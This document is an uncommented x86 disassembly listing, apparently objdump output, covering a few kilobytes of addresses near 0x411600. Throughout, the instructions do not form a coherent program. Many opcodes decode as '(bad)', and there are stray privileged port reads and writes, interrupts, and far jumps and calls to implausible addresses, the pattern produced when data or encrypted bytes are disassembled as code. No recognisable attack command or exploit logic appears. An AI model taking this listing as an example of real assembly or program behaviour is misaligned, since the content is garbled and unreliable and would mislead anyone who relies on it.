  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	das    
  4115ac:	adc    BYTE PTR [ecx],0xa0
  4115af:	inc    eax
  4115b0:	scas   eax,DWORD PTR es:[edi]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	enter  0x37d,0xba
  4115bb:	adc    DWORD PTR [edi],eax
  4115bd:	cmp    eax,0x324a154b
  4115c2:	or     BYTE PTR [ecx],al
  4115c4:	sar    BYTE PTR [ecx],1
  4115c6:	jl     0x411568
  4115c8:	adc    al,0x34
  4115ca:	cwde   
  4115cb:	cli    
  4115cc:	ds popa 
  4115ce:	sahf   
  4115cf:	jnp    0x4115d8
  4115d1:	daa    
  4115d2:	sub    eax,0xeb6e88f1
  4115d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d8:	(bad)  
  4115d9:	js     0x4115a9
  4115db:	sti    
  4115dc:	sbb    BYTE PTR [esi-0x646b3a28],cl
  4115e2:	xor    dh,BYTE PTR [ecx]
  4115e4:	ja     0x4115ec
  4115e6:	inc    eax
  4115e7:	in     eax,dx
  4115e8:	dec    edi
  4115e9:	(bad)  
  4115ea:	lds    ebp,FWORD PTR [esp+ebp*1-0x17cab7b8]
  4115f1:	push   ds
  4115f2:	jnp    0x4115c4
  4115f4:	iret   
  4115f5:	push   es
  4115f6:	xor    ah,BYTE PTR [eax-0x28]
  4115f9:	jbe    0x4115b1
  4115fb:	test   eax,0x2c8b7116
  411600:	fstp   DWORD PTR [ebp-0x6a]
  411603:	dec    eax
  411604:	mov    eax,ds:0x2cb83ade
  411609:	mov    esp,0x11d3cc44
  41160e:	add    al,0x82
  411610:	inc    ecx
  411611:	nop
  411612:	cmc    
  411613:	sar    BYTE PTR [di],0x48
  411617:	push   0xc357c25e
  41161c:	adc    eax,0x8e3f2702
  411621:	mov    esp,0x2bb6aae4
  411626:	push   esi
  411627:	pushf  
  411628:	cmp    ebp,ebp
  41162a:	call   0x8531269e
  41162f:	(bad)  
  411630:	sti    
  411631:	xchg   esp,eax
  411632:	sub    esp,DWORD PTR [ebx-0x23f33bd5]
  411638:	outs   dx,BYTE PTR ds:[esi]
  411639:	ins    DWORD PTR es:[edi],dx
  41163a:	push   es
  41163b:	jno    0x4115e2
  41163d:	test   BYTE PTR [esi],ch
  41163f:	repz xor ecx,ecx
  411642:	out    dx,al
  411643:	lahf   
  411644:	fmul   st(4),st
  411646:	lea    ebp,ds:0x3ed83046
  41164c:	adc    eax,0xf5ecc046
  411651:	dec    edx
  411652:	(bad)  
  411653:	(bad)  
  411654:	fcmovnbe st,st(5)
  411656:	mov    al,ds:0x60892a4e
  41165b:	lods   eax,DWORD PTR ds:[esi]
  41165c:	adc    bl,ah
  41165e:	pop    es
  41165f:	add    al,dh
  411661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411662:	rcl    BYTE PTR [ebx-0x5e5c12d],1
  411668:	xor    DWORD PTR [eax],eax
  41166a:	call   0x1a51:0x21bc9ec4
  411671:	push   cs
  411672:	pop    es
  411673:	das    
  411674:	popf   
  411675:	pusha  
  411676:	jle    0x41165a
  411678:	addr16 (bad) 
  41167a:	xor    BYTE PTR [edx-0x1d],ch
  41167d:	pop    edx
  41167e:	jle    0x411607
  411680:	jl     0x411661
  411682:	imul   ebp,DWORD PTR [esi+0x49],0x109dd0d1
  411689:	test   al,0xf1
  41168b:	jle    0x4116ae
  41168d:	cmp    DWORD PTR [esi+0x6e],0x3912fb5f
  411694:	ror    dl,0x23
  411697:	and    ebx,DWORD PTR [edx]
  411699:	xor    DWORD PTR [edx+0x79bc48e2],edi
  41169f:	mov    DWORD PTR [ecx-0x44],0x4568abcf
  4116a6:	rol    DWORD PTR [esi+0x5d2ee04b],1
  4116ac:	or     DWORD PTR [eax],0xffffffeb
  4116af:	xor    al,0xdf
  4116b1:	dec    ecx
  4116b2:	out    0xca,eax
  4116b4:	push   edx
  4116b5:	pop    ds
  4116b6:	mov    ebx,0x51e1b48f
  4116bb:	jmp    0x4116b0
  4116bd:	jne    0x4116d1
  4116bf:	add    al,0x5a
  4116c1:	andps  xmm2,XMMWORD PTR ds:0xd936c54
  4116c8:	shl    BYTE PTR [edx+0x1a],cl
  4116cb:	rol    ebx,0xff
  4116ce:	push   ds
  4116cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116d0:	pop    ds
  4116d1:	jl     0x4116c1
  4116d3:	mov    BYTE PTR [esi+edx*2],cl
  4116d6:	or     ah,ch
  4116d8:	xor    al,0xe7
  4116da:	leave  
  4116db:	add    al,0x80
  4116dd:	arpl   bp,bp
  4116df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e0:	jnp    0x411747
  4116e2:	sbb    ebx,DWORD PTR ds:0x723b5e29
  4116e8:	pop    edx
  4116e9:	leave  
  4116ea:	sub    BYTE PTR [esi],0x3d
  4116ed:	pop    ss
  4116ee:	inc    eax
  4116ef:	sbb    al,0x8f
  4116f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f2:	stos   DWORD PTR es:[edi],eax
  4116f3:	scas   al,BYTE PTR es:[edi]
  4116f4:	xor    eax,0xbb435b7f
  4116f9:	cmp    cl,ah
  4116fb:	push   esp
  4116fc:	inc    eax
  4116fd:	jbe    0x41167f
  4116ff:	adc    DWORD PTR [edx+0x3cee8b81],ecx
  411705:	popf   
  411706:	or     esi,edx
  411708:	inc    DWORD PTR [edx-0x7d]
  41170b:	test   DWORD PTR [ebp+0x7c],ebp
  41170e:	imul   DWORD PTR [ebx]
  411710:	jle    0x4116cd
  411712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411713:	out    dx,al
  411714:	in     al,0xd4
  411716:	dec    esp
  411717:	and    BYTE PTR [esi+0x5d],bl
  41171a:	int    0x83
  41171c:	and    eax,0x549dcb65
  411721:	and    DWORD PTR [ebx+esi*1-0x38],edi
  411725:	push   edi
  411726:	ja     0x411774
  411728:	ret    
  411729:	mov    bl,0x2
  41172b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172c:	lods   al,BYTE PTR ds:[esi]
  41172d:	ins    BYTE PTR es:[edi],dx
  41172e:	sbb    edx,edx
  411730:	cdq    
  411731:	cmp    eax,0x31cffc52
  411736:	imul   edi
  411738:	pop    edx
  411739:	test   BYTE PTR [ecx-0x80],dl
  41173c:	aam    0xfd
  41173e:	cmp    bl,ch
  411740:	daa    
  411741:	(bad)  
  411742:	mov    edx,0x6a2d3c04
  411747:	aaa    
  411748:	pushf  
  411749:	sbb    edx,esp
  41174b:	lods   al,BYTE PTR ds:[esi]
  41174c:	rcl    DWORD PTR [edx],cl
  41174e:	or     al,0x59
  411750:	(bad)  
  411751:	cmp    al,0x70
  411753:	jmp    0xc3f:0x697bc981
  41175a:	int3   
  41175b:	mov    ah,0x56
  41175d:	xchg   edi,eax
  41175e:	and    edi,DWORD PTR [ebx-0x7a]
  411761:	and    ebx,DWORD PTR [ebx]
  411763:	jge    0x4117e0
  411765:	stos   BYTE PTR es:[edi],al
  411766:	lahf   
  411767:	imul   esp,DWORD PTR ds:0xcc280a41,0xc5058ff4
  411771:	(bad)  
  411772:	sub    al,0x31
  411774:	sahf   
  411775:	jns    0x411708
  411777:	test   bh,0xeb
  41177a:	movq   QWORD PTR [edi-0x67],mm0
  41177e:	sub    esp,DWORD PTR [ebp+0x29b14b2b]
  411784:	popa   
  411785:	rep stos BYTE PTR es:[edi],al
  411787:	addr16 fwait
  411789:	or     DWORD PTR [ecx-0x70],esi
  41178c:	loop   0x4117ed
  41178e:	push   edi
  41178f:	mov    bl,0xe1
  411791:	icebp  
  411792:	loop   0x4117f8
  411794:	(bad)  
  411795:	repnz mov esi,0xa196a40a
  41179b:	push   es
  41179c:	cmp    bh,BYTE PTR ds:0xb0bf7655
  4117a2:	inc    ebx
  4117a3:	nop
  4117a4:	or     eax,0xee83cb93
  4117a9:	xor    BYTE PTR [edx-0x1be7ee80],0x75
  4117b0:	mov    bl,0x43
  4117b2:	dec    esi
  4117b3:	pop    ebx
  4117b4:	icebp  
  4117b5:	retf   0x5c3e
  4117b8:	fbld   TBYTE PTR [edi-0x8964935]
  4117be:	mov    al,ds:0xf8d5cb2b
  4117c3:	data16 mov dl,0xc0
  4117c6:	int3   
  4117c7:	in     eax,0xe9
  4117c9:	mov    cl,0x43
  4117cb:	std    
  4117cc:	fsubr  st(5),st
  4117ce:	jae    0x411782
  4117d0:	mov    esp,edi
  4117d2:	push   esp
  4117d3:	jp     0x411770
  4117d5:	stos   BYTE PTR es:[edi],al
  4117d6:	loopne 0x41181c
  4117d8:	xor    esp,DWORD PTR [ecx]
  4117da:	pop    edi
  4117db:	ins    BYTE PTR es:[edi],dx
  4117dc:	dec    esi
  4117dd:	xor    edx,ebp
  4117df:	xlat   BYTE PTR ds:[ebx]
  4117e0:	push   ebp
  4117e1:	dec    ebx
  4117e2:	jb     0x4117dd
  4117e4:	ss and esi,eax
  4117e7:	(bad)  
  4117e8:	loopne 0x411806
  4117ea:	pushf  
  4117eb:	push   esp
  4117ec:	imul   edx,edi,0xffffffdf
  4117ef:	cli    
  4117f0:	ret    0x97de
  4117f3:	push   ebp
  4117f4:	or     edx,DWORD PTR [edx-0x107434bc]
  4117fa:	adc    DWORD PTR [esi+0x34],eax
  4117fd:	inc    esi
  4117fe:	fwait
  4117ff:	mul    BYTE PTR [ebp+0x4926b3a0]
  411805:	push   edi
  411806:	jl     0x4117a8
  411808:	jnp    0x411856
  41180a:	test   DWORD PTR [esi-0x24],0x60008045
  411811:	or     eax,0xf5719f5b
  411816:	shr    bl,1
  411818:	mov    DWORD PTR [edx],edx
  41181a:	je     0x411817
  41181c:	inc    esi
  41181d:	add    edi,esp
  41181f:	loop   0x41180d
  411821:	cmc    
  411822:	xor    eax,0xd6286c7d
  411827:	les    esp,FWORD PTR ds:0x5550bd84
  41182d:	sub    eax,0xa18ef4a1
  411832:	or     eax,0x9cb80acf
  411837:	push   esi
  411838:	push   cs
  411839:	xor    dl,bh
  41183b:	nop
  41183c:	test   BYTE PTR [edi],ch
  41183e:	stos   DWORD PTR es:[edi],eax
  41183f:	push   ebx
  411840:	adc    DWORD PTR [ecx+esi*1+0x6060df8c],ebx
  411847:	sub    al,0x13
  411849:	add    dh,BYTE PTR [ebx+0x468f883]
  41184f:	jno    0x411892
  411851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411852:	nop
  411853:	loopne 0x411866
  411855:	call   0xac05860b
  41185a:	push   cs
  41185b:	fnsave [esi+0x4f]
  41185e:	cwde   
  41185f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411860:	add    dh,BYTE PTR [ebx+0x1e]
  411863:	cmp    edi,DWORD PTR ds:0xb9dbb547
  411869:	sbb    BYTE PTR [eax-0x38ebd0d8],bl
  41186f:	cld    
  411870:	dec    edx
  411871:	cmp    eax,0xb8b31fb6
  411876:	jne    0x411812
  411878:	fistp  DWORD PTR [ebx+edx*4+0xb874a33]
  41187f:	mov    ebx,0x6b806b1f
  411884:	xor    ch,BYTE PTR [ebx]
  411886:	fcom   st(7)
  411888:	xlat   BYTE PTR ds:[ebx]
  411889:	mov    bl,dl
  41188b:	adc    al,BYTE PTR [eax+0x66711c41]
  411891:	mov    eax,0xf6f2596c
  411896:	or     BYTE PTR [esi-0x168f5681],dl
  41189c:	enter  0x7630,0xc8
  4118a0:	mov    DWORD PTR [ebp+0x5e924274],ecx
  4118a6:	(bad)
  4118a9:	cmp    al,0xd9
  4118ab:	(bad)  
  4118ac:	mov    ebx,0x83843d03
  4118b1:	clc    
  4118b2:	je     0x4118ba
  4118b4:	and    esp,DWORD PTR ds:0x10a7318a
  4118ba:	in     al,dx
  4118bb:	mov    ah,bl
  4118bd:	mov    eax,ds:0xe9fdfd3
  4118c2:	fwait
  4118c3:	sbb    eax,0xe0e289d0
  4118c8:	adc    eax,0x763a74bc
  4118cd:	jnp    0x411853
  4118cf:	je     0x4118a3
  4118d1:	ins    DWORD PTR es:[edi],dx
  4118d2:	ins    BYTE PTR es:[edi],dx
  4118d3:	shr    BYTE PTR [edi+0x71],1
  4118d6:	xchg   ebx,eax
  4118d7:	jo     0x411863
  4118d9:	sub    BYTE PTR [edx+0x65d10edf],ah
  4118df:	adc    eax,0x8f7b07cb
  4118e4:	cmp    BYTE PTR [edx+0x315f2dfa],al
  4118ea:	adc    al,0x8
  4118ec:	pop    ds
  4118ed:	adc    BYTE PTR [edx+0x18],0x22
  4118f1:	sbb    esi,DWORD PTR ds:0x30a02bf
  4118f7:	cmc    
  4118f8:	add    BYTE PTR [ecx],cl
  4118fa:	xor    DWORD PTR [edx],0xc443ac92
  411900:	mov    edi,0xda56cf94
  411905:	sahf   
  411906:	push   es
  411907:	es push eax
  411909:	not    DWORD PTR [esi-0x2a]
  41190c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190d:	sbb    al,0xb8
  41190f:	pop    ecx
  411910:	arpl   sp,bp
  411912:	das    
  411913:	(bad)  
  411914:	fdivr  DWORD PTR [eax+0x74]
  411917:	push   es
  411918:	and    DWORD PTR [esi+0x12],ebp
  41191b:	or     al,0xb6
  41191d:	xor    DWORD PTR [ecx+0x4],ecx
  411920:	in     eax,0x6e
  411922:	hlt    
  411923:	(bad)  
  411924:	stc    
  411925:	dec    esp
  411926:	pusha  
  411927:	in     al,dx
  411928:	in     al,dx
  411929:	in     al,dx
  41192a:	aas    
  41192b:	xor    BYTE PTR [esi+edi*4+0x4617bf84],dl
  411932:	clc    
  411933:	les    esi,FWORD PTR ds:0xf946a303
  411939:	cmc    
  41193a:	sti    
  41193b:	dec    esi
  41193c:	dec    esi
  41193d:	adc    BYTE PTR [ebp-0x7d],0xc2
  411941:	lds    edi,FWORD PTR [ebx]
  411943:	mov    esi,0x7c5dc34
  411948:	pop    ecx
  411949:	xchg   edx,eax
  41194a:	xor    edx,edx
  41194c:	clc    
  41194d:	mov    ebx,0x8bd651a6
  411952:	in     eax,dx
  411953:	or     BYTE PTR [edi],al
  411955:	pop    ecx
  411956:	mov    ecx,0x65718a37
  41195b:	in     al,dx
  41195c:	jle    0x4119b8
  41195e:	(bad)  
  41195f:	jno    0x41198c
  411961:	dec    esi
  411962:	loopne 0x41195d
  411964:	jl     0x4118ef
  411966:	mov    eax,0x261aed2e
  41196b:	push   es
  41196c:	js     0x411981
  41196e:	inc    ebp
  41196f:	add    BYTE PTR [edi+0x3c],bh
  411972:	nop
  411973:	and    al,bh
  411975:	js     0x41190f
  411977:	pop    ebp
  411978:	jo     0x41196c
  41197a:	inc    esi
  41197b:	cmp    ch,ch
  41197d:	xchg   esi,eax
  41197e:	adc    BYTE PTR [edx+edx*8+0x53],0x9
  411983:	not    BYTE PTR [ebx+0x27509849]
  411989:	popa   
  41198a:	adc    DWORD PTR [esi+0x72132f3d],ebp
  411990:	xchg   esp,eax
  411991:	cmp    DWORD PTR [ecx],0xfffffff5
  411994:	pop    esp
  411995:	xor    eax,0x5da4e040
  41199a:	inc    eax
  41199b:	sub    DWORD PTR [eax+0x7e3582fa],eax
  4119a1:	mov    DWORD PTR [ebp-0x2d540667],ebx
  4119a7:	popa   
  4119a8:	ds pop esp
  4119aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ab:	hlt    
  4119ac:	and    DWORD PTR [ebx-0x39b04f7a],eax
  4119b2:	jno    0x5fbce44
  4119b8:	mov    esp,ds
  4119ba:	dec    ebp
  4119bb:	or     bl,BYTE PTR [edi-0x1a]
  4119be:	pop    ecx
  4119bf:	xchg   esp,eax
  4119c0:	and    esi,0x4f786b76
  4119c6:	fwait
  4119c7:	sub    cl,BYTE PTR [ecx-0x41]
  4119ca:	add    BYTE PTR [ebx],ah
  4119cc:	popa   
  4119cd:	xchg   edx,eax
  4119ce:	test   DWORD PTR ds:0xe2a4ac60,ebx
  4119d4:	add    BYTE PTR [edx+0x3694e7c1],0x29
  4119db:	mov    al,ds:0x5e52e50a
  4119e0:	mov    ss,edi
  4119e2:	mov    ah,0x87
  4119e4:	test   DWORD PTR es:[ebp+0x37fb0a03],esi
  4119eb:	ins    BYTE PTR es:[edi],dx
  4119ec:	and    DWORD PTR [edx+0x4d],0x42eeb1bc
  4119f3:	lods   eax,DWORD PTR ds:[esi]
  4119f4:	mov    ebx,0xf7ce29a9
  4119f9:	xlat   BYTE PTR ds:[ebx]
  4119fa:	sbb    DWORD PTR [eax-0x4ba286e3],esi
  411a00:	xchg   esi,eax
  411a01:	push   edi
  411a02:	mov    ecx,DWORD PTR [eax+0x37a7ebb4]
  411a08:	out    dx,eax
  411a09:	pop    edx
  411a0a:	pusha  
  411a0b:	aam    0x79
  411a0d:	push   ebp
  411a0e:	fwait
  411a0f:	pop    ecx
  411a10:	cmp    ecx,esp
  411a12:	adc    ebp,esi
  411a14:	add    al,0x97
  411a16:	stos   DWORD PTR es:[edi],eax
  411a17:	ffree  st(7)
  411a19:	lods   eax,DWORD PTR ds:[esi]
  411a1a:	jbe    0x4119b0
  411a1c:	push   es
  411a1d:	xchg   esp,eax
  411a1e:	aad    0x57
  411a20:	popa   
  411a21:	inc    eax
  411a22:	fnstcw WORD PTR [eax-0x15b8e55]
  411a28:	neg    BYTE PTR [ebx+0x36]
  411a2b:	shl    DWORD PTR [ecx+0x11],cl
  411a2e:	pop    ecx
  411a2f:	push   DWORD PTR [ebx+0x63d7a813]
  411a35:	inc    ebp
  411a36:	or     cl,dl
  411a38:	mov    cl,0xf2
  411a3a:	fisubr DWORD PTR [eax+0x61]
  411a3d:	sub    ch,bh
  411a3f:	cli    
  411a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a41:	xor    cx,WORD PTR es:[ebx+0x46]
  411a46:	pop    ebx
  411a47:	int3   
  411a48:	jle    0x411ac1
  411a4a:	dec    ecx
  411a4b:	jecxz  0x4119d1
  411a4d:	addr16 sub eax,0x3dc4fc81
  411a53:	sub    BYTE PTR [ecx-0x9],al
  411a56:	pop    ss
  411a57:	push   edi
  411a58:	cmc    
  411a59:	jmp    0x411ad0
  411a5b:	cld    
  411a5c:	mov    edi,0xe72bd706
  411a61:	sub    bh,BYTE PTR [ebx+ebp*1-0x68b4a252]
  411a68:	fdiv   st,st(2)
  411a6a:	bound  eax,QWORD PTR [ecx+ebp*8-0x4d]
  411a6e:	sub    al,0xcf
  411a70:	out    0xa1,eax
  411a72:	bswap  ecx
  411a74:	jp     0x411a43
  411a76:	adc    BYTE PTR [edx],0xf7
  411a79:	(bad)  
  411a7a:	mov    ebx,0x5dc1f3a5
  411a7f:	inc    esp
  411a80:	ss add al,0x74
  411a83:	sti    
  411a84:	cmp    eax,0xc85e20e3
  411a89:	add    DWORD PTR [ecx-0x8760f0e],edi
  411a8f:	xchg   esi,eax
  411a90:	shl    BYTE PTR [edx+0x26],cl
  411a93:	cmp    esp,DWORD PTR [edi-0x73]
  411a96:	ficomp WORD PTR [ebp-0x74]
  411a99:	popa   
  411a9a:	sbb    esi,DWORD PTR [esi]
  411a9c:	adc    esp,ebx
  411a9e:	or     ebx,DWORD PTR [ecx]
  411aa0:	push   0x5414e64c
  411aa5:	ins    DWORD PTR es:[edi],dx
  411aa6:	mov    esp,0x6f5e2cd
  411aab:	imul   esi,ebx,0xfdbb3c60
  411ab1:	sbb    ecx,DWORD PTR [edi+0x5a95dc04]
  411ab7:	icebp  
  411ab8:	push   cs
  411ab9:	icebp  
  411aba:	out    0x11,al
  411abc:	pop    eax
  411abd:	loope  0x411ab6
  411abf:	pop    edx
  411ac0:	or     eax,0xffffffe2
  411ac3:	ja     0x411b0a
  411ac5:	pop    ebp
  411ac6:	or     eax,ebp
  411ac8:	xchg   ecx,eax
  411ac9:	lock sti 
  411acb:	xchg   DWORD PTR [ebp-0x648eaaa6],edi
  411ad1:	adc    al,0xe4
  411ad3:	loopne 0x411b17
  411ad5:	push   ss
  411ad6:	retf   0x53c4
  411ad9:	ins    DWORD PTR es:[edi],dx
  411ada:	sbb    BYTE PTR [edi-0x7bd2aed1],dl
  411ae0:	int    0x80
  411ae2:	pop    ds
  411ae3:	mov    edx,0xf5c8e993
  411ae8:	jo     0x411aad
  411aea:	adc    esi,DWORD PTR ds:0xf1110fca
  411af0:	jo     0x411ab8
  411af2:	icebp  
  411af3:	loope  0x411b2c
  411af5:	sar    BYTE PTR [ebx-0xcb20237],1
  411afb:	mov    bl,0x6a
  411afd:	mov    ds:0x619d054,eax
  411b02:	out    dx,al
  411b03:	cld    
  411b04:	cmp    cl,BYTE PTR [ebx-0x40]
  411b07:	es (bad) 
  411b0a:	inc    ecx
  411b0b:	inc    esp
  411b0c:	inc    ecx
  411b0d:	bound  esi,QWORD PTR [ecx+ebp*1]
  411b10:	jmp    0x4771:0x50b23c0e
  411b17:	push   0x816a595d
  411b1c:	lea    ecx,[eax+0x53]
  411b1f:	bound  edi,QWORD PTR [eax+0x76ae9103]
  411b25:	and    dl,BYTE PTR ds:0x45d28609
  411b2b:	mov    eax,0x481c670a
  411b30:	adc    esi,DWORD PTR ds:0x96022df
  411b36:	xchg   DWORD PTR [ebx],esi
  411b38:	or     eax,DWORD PTR [eax-0xdcd85d4]
  411b3e:	aas    
  411b3f:	sub    al,0xb1
  411b41:	test   BYTE PTR [edx-0x46b2c3e5],al
  411b47:	out    dx,al
  411b48:	aam    0x78
  411b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4b:	push   ss
  411b4c:	mov    bl,0x37
  411b4e:	inc    ecx
  411b4f:	loope  0x411b9a
  411b51:	jns    0x411bba
  411b53:	mov    bh,0x6b
  411b55:	stos   DWORD PTR es:[edi],eax
  411b56:	xchg   esi,eax
  411b57:	mov    al,ds:0xd7364fa1
  411b5c:	sub    dh,dl
  411b5e:	and    bl,dh
  411b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b61:	xchg   al,al
  411b63:	bound  edx,QWORD PTR [ecx+eax*2+0x2ce6c933]
  411b6a:	inc    esp
  411b6b:	pop    ecx
  411b6c:	pop    ecx
  411b6d:	inc    ebp
  411b6e:	cwde   
  411b6f:	sbb    dh,BYTE PTR [ecx+eax*4]
  411b72:	inc    edx
  411b73:	mov    bh,0xb9
  411b75:	sbb    eax,0x4deb1703
  411b7a:	aaa    
  411b7b:	jecxz  0x411bce
  411b7d:	aam    0x39
  411b7f:	shl    BYTE PTR [esi+0x53],1
  411b82:	js     0x411bba
  411b84:	hlt    
  411b85:	popa   
  411b86:	loope  0x411b94
  411b88:	popf   
  411b89:	arpl   WORD PTR ds:0x228a26ed,dx
  411b8f:	repnz mov esi,0xd69ffebf
  411b95:	test   BYTE PTR [esi+0x7d],bh
  411b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b99:	adc    eax,0x337f6ddc
  411b9e:	inc    ecx
  411b9f:	add    esi,esi
  411ba1:	pushf  
  411ba2:	mov    eax,0xd5cc47d3
  411ba7:	sub    DWORD PTR [eax-0x3d1c6fe2],ebx
  411bad:	fdecstp 
  411baf:	sbb    al,0xa2
  411bb1:	ins    DWORD PTR es:[edi],dx
  411bb2:	jmp    0x57d5:0x76f610e8
  411bb9:	mov    bl,0x1c
  411bbb:	sub    ch,bh
  411bbd:	out    dx,al
  411bbe:	xor    BYTE PTR [edx-0x7e],bh
  411bc1:	mov    esp,DWORD PTR [esi+0x5ccfcb09]
  411bc7:	pop    ebx
  411bc8:	in     eax,dx
  411bc9:	ret    0x1b85
  411bcc:	mov    ebp,0xfdcf737
  411bd1:	fld    DWORD PTR [edi+0x39cba207]
  411bd7:	cmp    edx,0xa654b816
  411bdd:	push   ds
  411bde:	xor    ecx,DWORD PTR [esi+0x6e]
  411be1:	jo     0x411b84
  411be3:	xchg   esp,eax
  411be4:	pop    es
  411be5:	mov    edx,0x2371e65
  411bea:	aad    0x18
  411bec:	inc    eax
  411bed:	adc    ebp,eax
  411bef:	mov    esi,0xf3f340a7
  411bf4:	pop    ds
  411bf5:	xlat   BYTE PTR ds:[ebx]
  411bf6:	sub    BYTE PTR [eax+0x4],0x3b
  411bfa:	test   eax,0x277a499d
  411bff:	nop
  411c00:	and    bl,0x75
  411c03:	dec    eax
  411c04:	(bad)  
  411c05:	pushf  
  411c06:	pop    ss
  411c07:	or     eax,0xa5cc90db
  411c0c:	gs or  BYTE PTR ds:[ebx+0x70],bl
  411c11:	xor    BYTE PTR [ecx+0x354113ed],al
  411c17:	adc    al,0x35
  411c19:	jb     0x411c92
  411c1b:	cmp    DWORD PTR [ebx+0x1b2a428c],ebx
  411c21:	pop    es
  411c22:	sbb    al,0x9b
  411c24:	jle    0x411bf3
  411c26:	sbb    al,0x71
  411c28:	imul   bx,WORD PTR [ecx+0x71dd2217],0x2d45
  411c31:	(bad)  
  411c32:	pop    edx
  411c33:	pop    eax
  411c34:	fldenv [ebp-0xf]
  411c37:	mov    WORD PTR [ecx],?
  411c39:	xchg   esi,eax
  411c3a:	iret   
  411c3b:	fimul  DWORD PTR [edi-0x64]
  411c3e:	push   ebx
  411c3f:	and    eax,0xf654680a
  411c44:	popf   
  411c45:	cld    
  411c46:	sti    
  411c47:	jmp    0x411c19
  411c49:	into   
  411c4a:	sub    ebp,ecx
  411c4c:	pusha  
  411c4d:	icebp  
  411c4e:	stos   BYTE PTR es:[edi],al
  411c4f:	dec    ebp
  411c50:	sbb    al,0xa8
  411c52:	xchg   edi,eax
  411c53:	out    dx,eax
  411c54:	idiv   DWORD PTR ds:0xd1e2f59b
  411c5a:	cmp    dl,ah
  411c5c:	mov    ah,0x7c
  411c5e:	stos   BYTE PTR es:[edi],al
  411c5f:	pushf  
  411c60:	xor    eax,0x3bd5e5b6
  411c65:	enter  0xa351,0xe2
  411c69:	add    al,0xfc
  411c6b:	add    DWORD PTR [ebp-0x424c42c],ecx
  411c71:	out    dx,eax
  411c72:	jp     0x411c61
  411c74:	cmc    
  411c75:	push   es
  411c76:	xor    edx,ebx
  411c78:	cmp    DWORD PTR [ecx+0x2721aefc],edx
  411c7e:	xchg   DWORD PTR [eax-0x3b67b55],eax
  411c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c86:	pop    edx
  411c87:	test   dh,al
  411c89:	in     al,dx
  411c8a:	dec    esi
  411c8b:	and    BYTE PTR [edi],bl
  411c8d:	mov    eax,0xc9c6538f
  411c92:	cmp    al,0xb9
  411c94:	(bad)  [eax+0x20]
  411c97:	or     eax,0x627fe9d8
  411c9c:	hlt    
  411c9d:	jb     0x411c4a
  411c9f:	dec    esi
  411ca0:	jns    0x411d04
  411ca2:	pop    ds
  411ca3:	xchg   BYTE PTR [ebx-0x3a7cd8d7],bh
  411ca9:	fild   WORD PTR [edi-0x2e]
  411cac:	cmp    BYTE PTR [edx+0x6],bl
  411caf:	sbb    eax,0x2c91c075
  411cb4:	mov    DWORD PTR [edi-0x50626c01],ebp
  411cba:	inc    ecx
  411cbb:	mov    al,0x18
  411cbd:	sub    al,0x69
  411cbf:	(bad)  
  411cc0:	mov    ecx,0x48a94a84
  411cc5:	push   esp
  411cc6:	imul   ebx,esp,0xe249f2d0
  411ccc:	mov    ch,0x22
  411cce:	or     dh,BYTE PTR [esi]
  411cd0:	pop    esi
  411cd1:	pop    ebp
  411cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cd3:	push   eax
  411cd4:	call   0x62a7c241
  411cd9:	xor    cl,ah
  411cdb:	sbb    BYTE PTR [edi-0x8],dh
  411cde:	fdivr  QWORD PTR [ebx+0x62]
  411ce1:	jnp    0x411c75
  411ce3:	mov    es,WORD PTR [edi+0x255673aa]
  411ce9:	loop   0x411d36
  411ceb:	jge    0x411cea
  411ced:	add    eax,0x829841bc
  411cf2:	cwde   
  411cf3:	inc    eax
  411cf4:	add    al,0xac
  411cf6:	jle    0x411cd1
  411cf8:	dec    ebx
  411cf9:	fadd   QWORD PTR [ebp-0x70]
  411cfc:	add    ah,ch
  411cfe:	adc    DWORD PTR [edx],eax
  411d00:	aad    0x66
  411d02:	sbb    BYTE PTR [ebp+eiz*4-0x18],dh
  411d06:	stc    
  411d07:	stos   BYTE PTR es:[edi],al
  411d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d09:	(bad)  
  411d0a:	cwde   
  411d0b:	pop    esi
  411d0c:	call   0x10f8:0x6c4328eb
  411d13:	jge    0x411cf3
  411d15:	dec    ebp
  411d16:	xchg   DWORD PTR [ebx+0x809765a],esp
  411d1c:	jmp    FWORD PTR [esi+0x0]
  411d1f:	inc    ebx
  411d20:	mov    al,0x3d
  411d22:	ds xchg edi,eax
  411d24:	xor    eax,0x58f5e3ad
  411d29:	fadd   DWORD PTR [esi-0x1ea2cd44]
  411d2f:	sub    DWORD PTR [ecx-0x9],0xf5264afa
  411d36:	into   
  411d37:	push   ss
  411d38:	pop    ds
  411d39:	in     al,0xae
  411d3b:	adc    edx,ecx
  411d3d:	xor    eax,0x1908f642
  411d42:	cdq    
  411d43:	pop    eax
  411d44:	cmp    eax,0xc395a92
  411d49:	pushf  
  411d4a:	and    edx,0x282641e
  411d50:	ror    DWORD PTR [ebx+esi*1-0x402602a],1
  411d57:	xor    DWORD PTR [ebx+0x789164de],ecx
